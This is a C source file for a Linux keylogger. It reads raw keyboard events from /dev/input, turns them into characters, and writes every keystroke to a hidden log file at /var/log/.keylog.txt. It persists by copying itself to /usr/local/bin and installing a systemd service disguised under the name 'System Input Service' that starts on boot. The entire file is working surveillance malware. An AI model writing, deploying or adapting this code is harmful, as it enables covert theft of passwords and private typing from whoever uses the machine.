#include "keyMaps.h"
#include <fcntl.h> // file controll
#include <linux/input.h> // input_event
#include <signal.h> //signals
#include <stdio.h> //standard input and output
#include <stdlib.h> //used for exit, size_t
#include <unistd.h> //used for intercating with the file API
#include <string.h> //used from manipulating strings

char DEVICE_INPUT_PATH[64] = "/dev/input/";

FILE *log_ptr = NULL;

int fd;

int caps_active = 0;
int shift_active = 0;

//function isnt needed after making the program run on boot!
void make_daemon(){
  pid_t pid = fork();

  if(pid < 0) exit(EXIT_FAILURE);
  if(pid > 0) exit(EXIT_SUCCESS);

  if (setsid() < 0) exit(EXIT_FAILURE);

  chdir("/");
  umask(0);
}

char *handleCharPressed(short ev_code, int ev_value){
	if (caps_active == 1 || shift_active == 1){
		if (shift_key_map[ev_code] != NULL){
			return shift_key_map[ev_code];
		}
	}
	if (key_map[ev_code] != NULL){
		return key_map[ev_code];
	}
	return "";
}

void handleKeyPressed(short ev_code, int ev_value){
	setvbuf(log_ptr, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	if (ev_code == KEY_CAPSLOCK && ev_value == 1){
		caps_active = (caps_active + 1) % 2;
	}
	else if (ev_code == KEY_LEFTSHIFT || ev_code == KEY_RIGHTSHIFT){
		if(ev_value == 0){
			shift_active = 0;
		}
		else{
			shift_active = 1;
		}
	}
	else if (ev_value != 0){
    fprintf(log_ptr ,"%s", handleCharPressed(ev_code, ev_value));
	}
}

void cleanNexit(int sig) {
  if (log_ptr != NULL){
    fprintf(log_ptr, "\nProcess Terminated (Signal: %d)\n", sig);
    fclose(log_ptr);
  }
  close(fd);
  exit(0);
}

void readingDevicesFile(){
  FILE *fp = NULL;
  long length;
  char temp_eventX[16];
  char buffer[256];

  //opening the file
  fp = fopen("/proc/bus/input/devices", "rb");
  if (fp == NULL){
    perror("Error opening /devices file");
    return EXIT_FAILURE;
  }

  //reading the file into the buffer
  while(fgets(buffer, sizeof(buffer), fp)){
    char *e_ptr = strstr(buffer, "event");
    if (e_ptr){
      sscanf(e_ptr, "%s", temp_eventX);
    }

    if (strstr(buffer, "EV=120013")) {
      strncat(DEVICE_INPUT_PATH, temp_eventX, 52);
    }
  }

  fclose(fp);
}

void createServiceFile(){
  FILE *fp = fopen("/etc/systemd/system/KeyLogger.service", "w");
  if (fp == NULL){
    perror("Error trying to create the .system file");
    exit(EXIT_FAILURE);
  }

  fprintf(fp, "[Unit]\n");
  fprintf(fp, "Description=System Input Service\n");
  fprintf(fp, "After=local-fs.target\n\n");
  fprintf(fp, "[Service]\n");
  fprintf(fp, "Type=simple\n");
  fprintf(fp, "ExecStart=/usr/local/bin/KeyLogger\n"); // Points to the NEW location
  fprintf(fp, "Restart=always\n\n");
  fprintf(fp, "[Install]\n");
  fprintf(fp, "WantedBy=multi-user.target\n");

  fclose(fp);
}

void runOnBoot(char cur_path[1024]){
  printf("Detected a new version. Installing...\n");

  system("systemctl stop KeyLogger.service 2>/dev/null");

  char cmd[2048];
  snprintf(cmd, sizeof(cmd), "cp %s /usr/local/bin/KeyLogger", cur_path);

  if(system(cmd) == -1){
    perror("Error while trying to copy the file to /usr/local/bin/KeyLogger");
    exit(EXIT_FAILURE);
  }

  if (system("chmod +x /usr/local/bin/KeyLogger") != 0)
  {
    perror("Error while trying to change premission of the program");
    exit(EXIT_FAILURE);
  }

  createServiceFile();

  system("systemctl daemon-reload");
  system("systemctl enable KeyLogger.service --now");

  exit(EXIT_SUCCESS);   
}

int main(int argc, char const *argv[])
{
  char cur_path[1024];
  ssize_t len = readlink("/proc/self/exe", cur_path, sizeof(cur_path) - 1);
  cur_path[len] = '\0';
  if (strcmp(cur_path,"/usr/local/bin/KeyLogger") != 0){
    runOnBoot(cur_path);
    printf("finished runOnBoot\n");
  }
  else{
    printf("your good\n");
  }


  readingDevicesFile();
  printf("%s\n", DEVICE_INPUT_PATH);

  //opening /input file descriptor
	
  struct input_event ev;

  signal(SIGINT, cleanNexit);
  signal(SIGTERM, cleanNexit);

  fd = open(DEVICE_INPUT_PATH, O_RDONLY);
  if (fd == -1) {
    perror("Error while opening the device file");
    printf("maybe you need root privilege...");
  }

  //opening log.txt file
  log_ptr = fopen("/var/log/.keylog.txt", "w");
  if (log_ptr == NULL)
  {
   	perror("Error while opening log file");
  }

  while(1){
  	ssize_t bytes_read = read(fd, &ev, sizeof(ev));
  	if (bytes_read == sizeof(ev)){
  		if (ev.type == EV_KEY){
  			handleKeyPressed(ev.code, ev.value);
  		}
  	}
  	else if (bytes_read == -1)
  	{
  		perror("Error reading device");
  		return EXIT_FAILURE;
  	}
  }

  return EXIT_SUCCESS;
}